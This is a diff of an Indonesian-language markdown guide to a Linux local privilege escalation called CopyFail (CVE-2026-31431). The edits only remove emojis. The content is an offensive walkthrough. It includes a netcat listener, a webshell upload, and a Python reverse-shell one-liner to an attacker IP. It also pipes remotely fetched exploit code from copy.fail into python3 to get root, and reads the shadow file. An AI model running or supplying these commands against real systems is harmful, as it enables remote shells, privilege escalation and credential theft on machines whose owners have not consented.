@@ -1,16 +1,16 @@
-# 🔥 CopyFail — Local Privilege Escalation (CVE‑2026‑31431)
+﻿# CopyFail — Local Privilege Escalation (CVE‑2026‑31431)
 
 > **Tujuan:** Mengeksploitasi kerentanan kernel Linux **CopyFail** (CVE‑2026‑31431) untuk naik dari user terbatas menjadi **root**.
 
 ---
 
-## 📌 Penjelasan Singkat
+## Penjelasan Singkat
 
 **CopyFail** adalah kerentanan **LPE** pada Linux kernel yang memanfaatkan bug pada mekanisme `copy_file_range` syscall. Attacker dapat mengakibatkan penulisan arbitrer ke memori kernel dan mendapatkan **uid=0 (root)** tanpa memerlukan kredensial tambahan.
 
 ---
 
-## 🛡️ Prerequisite Checks (Validasi Awal)
+## Prerequisite Checks (Validasi Awal)
 
 ### 1. Identitas User Saat Ini
 
@@ -25,7 +25,7 @@ whoami
 uname -r
 ```
 
-> ⚠️ **Catatan:** CopyFail berlaku untuk kernel **Ubuntu 5.15.0‑XXX (XXX < 181)**. Jika versi sudah dipatch, eksploit tidak akan berhasil.
+>  **Catatan:** CopyFail berlaku untuk kernel **Ubuntu 5.15.0‑XXX (XXX < 181)**. Jika versi sudah dipatch, eksploit tidak akan berhasil.
 
 ### 3. Tools yang Diperlukan
 
@@ -35,7 +35,7 @@ which curl python3
 
 ---
 
-## 🎧 Persiapan Listener (Attacker)
+## Persiapan Listener (Attacker)
 
 ```bash
 nc -lvnp 4444
@@ -43,9 +43,9 @@ nc -lvnp 4444
 
 ---
 
-## 📥 Akses Awal ke Target
+## Akses Awal ke Target
 
-### A️⃣ File Upload (Webshell)
+### A File Upload (Webshell)
 
 Upload `shell.php` dengan reverse shell payload, lalu akses:
 
@@ -53,7 +53,7 @@ Upload `shell.php` dengan reverse shell payload, lalu akses:
 curl http://<TARGET>/uploads/shell.php
 ```
 
-### B️⃣ Command Injection (Python Reverse Shell)
+### B Command Injection (Python Reverse Shell)
 
 ```bash
 python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
@@ -61,7 +61,7 @@ python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ATTACKER_IP>",44
 
 ---
 
-## 📂 Working Directory (`/tmp`)
+## Working Directory (`/tmp`)
 
 Setelah mendapat shell, pindah ke direktori **world‑writable**:
 
@@ -73,7 +73,7 @@ cd /tmp
 
 ---
 
-## 💥 Eksploitasi CopyFail
+## Eksploitasi CopyFail
 
 ```bash
 curl https://copy.fail/exp | python3 && su
@@ -100,7 +100,7 @@ curl https://copy.fail/exp | python3 && su
 
 ---
 
-## ✅ Verifikasi Hak Root
+## Verifikasi Hak Root
 
 ```bash
 id
@@ -118,7 +118,7 @@ root:$6$...:...
 
 ---
 
-## 🪜 Alur Eksploitasi
+## Alur Eksploitasi
 
 ```text
 Validasi kernel (uname -r)
@@ -136,7 +136,7 @@ Verifikasi root (id)
 
 ---
 
-## 📋 Checklist CopyFail
+## Checklist CopyFail
 
 - [ ] Verifikasi kernel rentan (`uname -r` → < 5.15.0-181).
 - [ ] Siapkan listener (`nc -lvnp 4444`).
@@ -147,7 +147,7 @@ Verifikasi root (id)
 
 ---
 
-## 📚 Referensi
+## Referensi
 
 - [CopyFail – CVE‑2026‑31431](https://copy.fail)
 - [Linux Exploit Suggester – The‑Z‑Labs](https://github.com/The-Z-Labs/linux-exploit-suggester)
